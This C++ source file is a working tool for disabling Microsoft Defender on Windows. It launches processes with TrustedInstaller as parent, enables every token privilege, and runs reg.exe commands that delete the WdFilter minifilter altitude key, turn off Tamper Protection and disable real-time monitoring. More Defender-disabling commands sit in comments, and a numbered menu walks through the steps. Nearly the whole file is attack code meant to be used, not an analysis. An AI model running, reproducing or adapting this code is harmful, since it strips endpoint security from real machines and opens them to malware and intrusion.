/*Author:@m3rcer
MIT License
Copyright(c) 2022 lab52.io

Permission is hereby granted, free of charge, to any person obtaining a copy
of this softwareand associated documentation files(the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions :

The above copyright noticeand this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <tchar.h>
#include <sddl.h>

#include <fltuser.h>
#include <wchar.h>
#include <stdio.h>
#include "tokens.h"

#pragma comment( lib, "FltLib.lib" )
#pragma comment(lib, "advapi32.lib")

static inline HANDLE getTrustedInstallerPHandle(void) {
	SC_HANDLE hSCManager, hTIService;
	SERVICE_STATUS_PROCESS lpServiceStatusBuffer = { 0 };

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
	hTIService = OpenService(hSCManager, L"TrustedInstaller", SERVICE_START | SERVICE_QUERY_STATUS);

	if (hTIService == NULL)
		goto cleanup_and_fail;

	do {
		unsigned long ulBytesNeeded;
		QueryServiceStatusEx(hTIService, SC_STATUS_PROCESS_INFO, (unsigned char*)&lpServiceStatusBuffer, sizeof(SERVICE_STATUS_PROCESS), &ulBytesNeeded);

		if (lpServiceStatusBuffer.dwCurrentState == SERVICE_STOPPED)
			if (!StartService(hTIService, 0, NULL))
				goto cleanup_and_fail;

	} while (lpServiceStatusBuffer.dwCurrentState == SERVICE_STOPPED);

	CloseServiceHandle(hSCManager);
	CloseServiceHandle(hTIService);

	return OpenProcess(PROCESS_CREATE_PROCESS, FALSE, lpServiceStatusBuffer.dwProcessId);

cleanup_and_fail:
	CloseServiceHandle(hSCManager);
	CloseServiceHandle(hTIService);

	return NULL;
}

static inline int enableTokenPrivilege(
	HANDLE hToken,
	const wchar_t* lpwcszPrivilege
) {
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES prevTp;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, lpwcszPrivilege, &luid))
		return 0; /* Cannot lookup privilege value */

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &prevTp, &cbPrevious);

	if (GetLastError() != ERROR_SUCCESS)
		return 0;

	prevTp.PrivilegeCount = 1;
	prevTp.Privileges[0].Luid = luid;

	prevTp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &prevTp, cbPrevious, NULL, NULL);

	if (GetLastError() != ERROR_SUCCESS)
		return 0;

	return 1;
}

static inline void acquireSeDebugPrivilege(void) {
	HANDLE hThreadToken;
	int retry = 1;

reacquire_token:
	OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hThreadToken);
	if (GetLastError() == ERROR_NO_TOKEN && retry) {
		ImpersonateSelf(SecurityImpersonation);
		retry--;

		goto reacquire_token;
	}

	if (!enableTokenPrivilege(hThreadToken, SE_DEBUG_NAME)) {
		fwprintf(stderr, L"Acquiring SeDebugPrivilege failed!");
		exit(2);
	}
}

static inline void setAllPrivileges(HANDLE hProcessToken) {
	/* Iterate over lplpwcszTokenPrivileges to add all privileges to a token */
	for (int i = 0; i < (sizeof(lplpcwszTokenPrivileges) / sizeof(*lplpcwszTokenPrivileges)); ++i)
		if (!enableTokenPrivilege(hProcessToken, lplpcwszTokenPrivileges[i]))
			;
			//wprintf(L"[D] Could not set privilege [%s], you most likely don't have it.\n", lplpcwszTokenPrivileges[i]);
}


HANDLE GetCurrentProcessHandle()
{
	HANDLE hProcess = GetCurrentProcess();
	if (hProcess)
	{
		return hProcess;
	}
	else
	{
		_tprintf(TEXT("Error getting current process handle.\n"));
		return NULL;
	}
}

BOOL GetCurrentProcessInformation(PROCESS_INFORMATION* pi)
{
	// Get the current process information 
	HANDLE hProcess = GetCurrentProcess();
	return TRUE;
}

static inline int TrustedInstallerProcessToDisableWdfilter() {

	STARTUPINFOEX startupInfo = { 0 };

	acquireSeDebugPrivilege();

	/* Start the TrustedInstaller service */
	HANDLE hTIPHandle = getTrustedInstallerPHandle();
	if (hTIPHandle == NULL) {
		fwprintf(stderr, L"[E] Could not open/start the TrustedInstaller service\n");
		exit(3);
	}

	wprintf(L"\n[+] Trusted Installer handle: %p\n", hTIPHandle);

	/* Initialize STARTUPINFO */

	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);

	startupInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	startupInfo.StartupInfo.wShowWindow = SW_SHOWNORMAL;

	/* Initialize attribute lists for "parent assignment" */

	size_t attributeListLength;

	InitializeProcThreadAttributeList(NULL, 1, 0, (size_t*)&attributeListLength);

	startupInfo.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListLength));
	InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, (size_t*)&attributeListLength);

	UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTIPHandle, sizeof(HANDLE), NULL, NULL);

	PROCESS_INFORMATION processInfo = { 0 };

	// Crash WdFilter
	wprintf(L"[!] Spawning registry with TrustedInstaller privileges to delete WdFilter \"Altitude\" regkey.\n");

	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\WdFilter Instance\" /v Altitude /f";

	if (CreateProcessW(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.\n[+] Execute option 1 to validate!", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);

		return 1;
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}
}

static inline int TrustedInstallerProcessToDisableTamperProtection() {

	STARTUPINFOEX startupInfo = { 0 };

	acquireSeDebugPrivilege();

	/* Start the TrustedInstaller service */
	HANDLE hTIPHandle = getTrustedInstallerPHandle();
	if (hTIPHandle == NULL) {
		fwprintf(stderr, L"[E] Could not open/start the TrustedInstaller service\n");
		exit(3);
	}

	wprintf(L"\n[+] Trusted Installer handle: %p\n", hTIPHandle);

	/* Initialize STARTUPINFO */

	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);

	startupInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	startupInfo.StartupInfo.wShowWindow = SW_SHOWNORMAL;

	/* Initialize attribute lists for "parent assignment" */

	size_t attributeListLength;

	InitializeProcThreadAttributeList(NULL, 1, 0, (size_t*)&attributeListLength);

	startupInfo.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListLength));
	InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, (size_t*)&attributeListLength);

	UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTIPHandle, sizeof(HANDLE), NULL, NULL);

	PROCESS_INFORMATION processInfo = { 0 };

	// Disable TamperProtection
	wprintf(L"[!] Spawning registry with TrustedInstaller privileges to alter Defender \"TamperProtection\" regkey from 5 to 4.\n");

	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 4 /f";

	if (CreateProcessW(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}
}

static inline int TrustedInstallerProcessToDisableAV() {

	STARTUPINFOEX startupInfo = { 0 };

	acquireSeDebugPrivilege();

	/* Start the TrustedInstaller service */
	HANDLE hTIPHandle = getTrustedInstallerPHandle();
	if (hTIPHandle == NULL) {
		fwprintf(stderr, L"[E] Could not open/start the TrustedInstaller service\n");
		exit(3);
	}

	wprintf(L"\n[+] Trusted Installer handle: %p\n", hTIPHandle);

	/* Initialize STARTUPINFO */

	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);

	startupInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	startupInfo.StartupInfo.wShowWindow = SW_SHOWNORMAL;

	/* Initialize attribute lists for "parent assignment" */

	size_t attributeListLength;
	InitializeProcThreadAttributeList(NULL, 1, 0, (size_t*)&attributeListLength);

	startupInfo.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListLength));
	InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, (size_t*)&attributeListLength);
	UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTIPHandle, sizeof(HANDLE), NULL, NULL);

	/* Create process */
	PROCESS_INFORMATION processInfo = { 0 };
	wprintf(L"[!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.\n[+] To disable other components of defender check source.\n");
	
	/* Disable other components of Defender
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f";
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f";
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f";
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f";
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f";
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f";
     */

	// Disable RealTimeMonitoring
	wchar_t cmd[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f ";
	
	if (CreateProcessW(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}

	/* Example to disable DisableIOAVProtection
	wprintf(L"\n[!] Spawning registry with TrustedInstaller privileges to Disable 'DisableIOAVProtection' regkey. \n[+] To disable other components of defender check source.\n");
	wchar_t cmd2[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f";
	
	if (CreateProcessW(
		NULL,
		cmd2,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
	else {
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}*/

}

static inline int TrustedInstallerProcessToEnableAV() {

	STARTUPINFOEX startupInfo = { 0 };

	acquireSeDebugPrivilege();

	/* Start the TrustedInstaller service */
	HANDLE hTIPHandle = getTrustedInstallerPHandle();
	if (hTIPHandle == NULL) {
		fwprintf(stderr, L"[E] Could not open/start the TrustedInstaller service\n");
		exit(3);
	}

	wprintf(L"\n[+] Trusted Installer handle: %p\n", hTIPHandle);

	/* Initialize STARTUPINFO */

	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);

	startupInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	startupInfo.StartupInfo.wShowWindow = SW_SHOWNORMAL;

	/* Initialize attribute lists for "parent assignment" */

	size_t attributeListLength;

	InitializeProcThreadAttributeList(NULL, 1, 0, (size_t*)&attributeListLength);

	startupInfo.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListLength));
	InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, (size_t*)&attributeListLength);

	UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTIPHandle, sizeof(HANDLE), NULL, NULL);

	/* Create process */
	PROCESS_INFORMATION processInfo = { 0 };
	wprintf(L"[!] Spawning registry with TrustedInstaller privileges to Enable 'RealtimeMonitoring' regkey.\n");

	 // Restore RealTimeMonitoring
	wchar_t cmd1[] = L"C:\\windows\\system32\\reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f ";

	if (CreateProcessW(
		NULL,
		cmd1,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}

	// Restore TamperProtection
	wprintf(L"\n[!] Spawning registry with TrustedInstaller privileges to Enable 'TamperProtection' regkey.\n");
	wchar_t cmd2[] = L"C:\\windows\\system32\\reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 5 /f";

	if (CreateProcessW(
		NULL,
		cmd2,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}
	
	// Restore WdFilter; Make sure to change Altitude number (Default: 328010)
	wprintf(L"\n[!] Spawning registry with TrustedInstaller privileges to restore WdFilter \"Altitude\" regkey.\n");

	const wchar_t* altitude_number = L"328010";
	wchar_t cmd3[200];
	_snwprintf_s(cmd3, sizeof(cmd3) / sizeof(wchar_t), L"C:\\windows\\system32\\reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\WdFilter Instance\" /v Altitude /t REG_SZ /d %s /f", altitude_number);

	if (CreateProcessW(
		NULL,
		cmd3,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&startupInfo.StartupInfo,
		&processInfo
	)) {
		//DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
		//HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);

		HANDLE hProcessToken;
		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
		setAllPrivileges(hProcessToken);

		wprintf(L"[+] Created process ID: %ld and assigned additional token privileges.", processInfo.dwProcessId);

		ResumeThread(processInfo.hThread);

		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);

		return 1;
	}
	else {
		/* Most commonly - 0x2 - The system cannot find the file specified. */
		fwprintf(stderr, L"[E] Process creation failed. Error code: 0x%08X\n", GetLastError());
		exit(4);
	}
}

// extract MINIFILTER information
int printMiniFilterData(FILTER_AGGREGATE_STANDARD_INFORMATION* lpFilterInfo) {

	FILTER_AGGREGATE_STANDARD_INFORMATION* fltInfo = NULL;
	char* fltName, * fltAlt;

	fltInfo = (FILTER_AGGREGATE_STANDARD_INFORMATION*)lpFilterInfo;

	// get Filter name
	int fltName_size = fltInfo->Type.MiniFilter.FilterNameLength;
	LONGLONG src = ((LONGLONG)lpFilterInfo) + fltInfo->Type.MiniFilter.FilterNameBufferOffset;
	fltName = (char*)malloc(fltName_size + 2);
	memset(fltName, 0, fltName_size + 2);
	memcpy(fltName, (void*)src, fltName_size);

	// get Filter altitude
	int fltAlt_size = fltInfo->Type.MiniFilter.FilterAltitudeLength;
	src = ((LONGLONG)lpFilterInfo) + fltInfo->Type.MiniFilter.FilterAltitudeBufferOffset;
	fltAlt = (char*)malloc(fltAlt_size + 2);
	memset(fltAlt, 0, fltAlt_size + 2);
	memcpy(fltAlt, (void*)src, fltAlt_size);


	// print only data about wdfilter minifilter
	if (fltInfo->Flags == FLTFL_ASI_IS_MINIFILTER) {

		// convert fltName to wchar_t*
		wchar_t wfltNameNullStr[16] = L"";
		wchar_t* wfltName;
		wfltName = wfltNameNullStr;
		swprintf(wfltName, 16, L"%15s", fltName);
		_wcslwr_s(wfltName, 16);

		// convert fltAlt to wchar_t*
		wchar_t wfltAltNullStr[16] = L"";
		wchar_t* wfltAlt;
		wfltAlt = wfltAltNullStr;
		swprintf(wfltAlt, 16, L"%15s", fltAlt);
		_wcslwr_s(wfltAlt, 16);

		// filtering out only WdFilter data if found
		int result = _wcsicmp(wfltName, L"       wdfilter");
		if (result == 0) {
			wprintf(L"\n[+] Enumerating WdFilter information:\n");
			wprintf(L"\tNext: %3d | Frame ID: %3d | No. of Instances: %3d | Name: %15s | Altitude: %15s\n",
				fltInfo->NextEntryOffset,
				fltInfo->Type.MiniFilter.FrameID,
				fltInfo->Type.MiniFilter.NumberOfInstances,
				wfltName, wfltAlt);
			return 97;
		}

		// wdfilter isn't found
		else {
			return 99;
		}
	}

	free(fltName);
	free(fltAlt);

	return 0;
}

HRESULT getMiniFilterData() {
	HRESULT res;
	DWORD dwBytesReturned;
	HANDLE hFilterFind;
	DWORD dwFilterInfoSize = 1024;
	LPVOID lpFilterInfo = HeapAlloc(GetProcessHeap(), NULL, dwFilterInfoSize);

	res = FilterFindFirst(FilterAggregateStandardInformation, lpFilterInfo, dwFilterInfoSize, &dwBytesReturned, &hFilterFind);
	if (res == HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) {
		_tprintf(TEXT("[!] No MiniFilter data found for WdFilter.\n"));
		return 9;
	}
	if (res != S_OK) {
		_tprintf(TEXT("Error! code enumerating WdFilter = 0x%x\n", GetLastError()));
	}

	// if wdfilter isn't found
	int result = printMiniFilterData((FILTER_AGGREGATE_STANDARD_INFORMATION*)lpFilterInfo);


	while (true) {
		// Enumerate all minifilters
		res = FilterFindNext(hFilterFind, FilterAggregateStandardInformation, lpFilterInfo, dwFilterInfoSize, &dwBytesReturned);
		if (res == HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) {
			break;
		}
		if (res != S_OK) {
			_tprintf(TEXT("[!] Error! Code = 0x%x\n", GetLastError()));
			return res; // Return the error code
		}
		// Print relevant information
		int result = printMiniFilterData((FILTER_AGGREGATE_STANDARD_INFORMATION*)lpFilterInfo);
		// if wdfilter is found
		if (result == 99) {
			return 99;
		}
		else if (result == 97) {
			return 97;
			exit;
		}
	}

	// Clean up and return
	HeapFree(GetProcessHeap(), 0, lpFilterInfo);
	FilterFindClose(hFilterFind);
	return S_OK; // Indicate success
}


DWORD WINAPI checkWdfilterRegOperations() {

	/* Create a buffer to store the value read from the registry */
	DWORD bufferSize = 256;
	char* value = (char*)malloc(bufferSize); // Allocate memory to hold the registry value

	if (value == NULL) {
		printf("Memory allocation failed.\n");
		return 97; // Return an error code
	}

	/* Open the registry key for reading */
	HKEY hKey;
	LONG lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\WdFilter Instance", 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS)
	{
		printf("[!] Error opening WdFilter Altitude Registry key: %d\n", lResult);
		free(value); // Free allocated memory
		return 99; // Return a custom error code
	}

	/* Read the value from the registry */
	lResult = RegQueryValueExA(hKey, "Altitude", NULL, NULL, (LPBYTE)value, &bufferSize);
	if (lResult != ERROR_SUCCESS)
	{
		if (lResult == ERROR_FILE_NOT_FOUND) {
			printf("[+] WdFilter Altitude Registry key has been successfully deleted.");
		}
		else {
			printf("[!] Error reading WdFilter Altitude Registry key: %d", lResult);
		}
		free(value); // Free allocated memory
		RegCloseKey(hKey); // Close the registry key
		return 98; // Exit the function with a custom error code
	}

	/* Print the value read from the registry */
	printf("[+] WdFilter Altitude Registry key Value: %s", value);

	/* Close the registry key */
	RegCloseKey(hKey);

	free(value); // Free allocated memory

	return 0;
}


/* Custom Error codes
97: driver still exists after reg delete, reboot to unload wdfilter
98: WdFilter Alititude reg key not found
99: Wdfilter Minidriver is unloaded
*/

int __cdecl _tmain(int argc, TCHAR* argv[]) {

	if (argc != 2) {
		_tprintf(TEXT("Sequential Usage: 1 --> 2 --> 3\n1: \tUnload WdFilter\n2: \tDisable Tamper Protection\n3: \tDisable AV/MDE\n"));
		_tprintf(TEXT("4: \tRestore AV/MDE settings"));
		return 1;
	}

	int command = _ttoi(argv[1]); // Convert command-line argument to an integer

	if (command == 1) {

		int result = checkWdfilterRegOperations();
		if (result == 1) {
			return 1; // Exit main if checkWdfilterRegOperations returns 1 
		}

		// 98 if reg key not found
		else if (result == 98) {
			int WdFilterResult;
			WdFilterResult = getMiniFilterData();
			// check if wdfilter driver is unloaded
			if (WdFilterResult == 99) {
				_tprintf(TEXT("\n[+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection."));
			}
			// driver still exists after reg delete, reboot to unload wdfilter
			if (WdFilterResult == 97) {
				_tprintf(TEXT("[+] Restart the system or wait a few minutes for WdFilter to unload."));
				_tprintf(TEXT("\n[+] Execute option 1 to validate!"));
			}
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}

		else {
			// Disable WdFilter using Trusted Installer privileges
			TrustedInstallerProcessToDisableWdfilter();
		}

		return 0;
	}


	else if (command == 2) {
		int result = checkWdfilterRegOperations();
		if (result == 1) {
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}

		if (result == 98) {
			int WdFilterResult;
			WdFilterResult = getMiniFilterData();
			if (WdFilterResult == 99) {
				TrustedInstallerProcessToDisableTamperProtection();
				_tprintf(TEXT("\n[+] Use option '3' to finally Disable AV/MDE."));
			}
			// driver still exists after reg delete, reboot to unload wdfilter
			if (WdFilterResult == 97) {
				_tprintf(TEXT("[+] Restart the system or wait a few minutes (~5mins) for WdFilter to unload."));
				_tprintf(TEXT("\n[+] Execute option 1 to validate!"));
			}
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}

		return 0;
	}

	else if (command == 3) {
		int result = checkWdfilterRegOperations();
		if (result == 1) {
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}

		if (result == 98) {
			int WdFilterResult;
			WdFilterResult = getMiniFilterData();
			if (WdFilterResult == 99) {
				TrustedInstallerProcessToDisableAV();
			}
			// driver still exists after reg delete, reboot to unload wdfilter
			if (WdFilterResult == 97) {
				_tprintf(TEXT("[+] Restart the system or wait a few minutes (~5mins) for WdFilter to unload."));
				_tprintf(TEXT("\n[+] Execute option 1 to validate!"));
			}
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}

		return 0;
	}

	else if (command == 4) {
		int result = checkWdfilterRegOperations();
		if (result == 1) {
			return 1; // Exit main if checkWdfilterRegOperations returns 1
		}
		_tprintf(TEXT("\n[+] Make sure to change Altitude in source (Default: 328010) and reboot computer after execution."));
		TrustedInstallerProcessToEnableAV();
		return 0;
	}

	else {
		_tprintf(TEXT("Invalid command. Use '1' to unload WdFilter and '2' to disable Tamper Protection.\n"));
		return 1;
	}
}

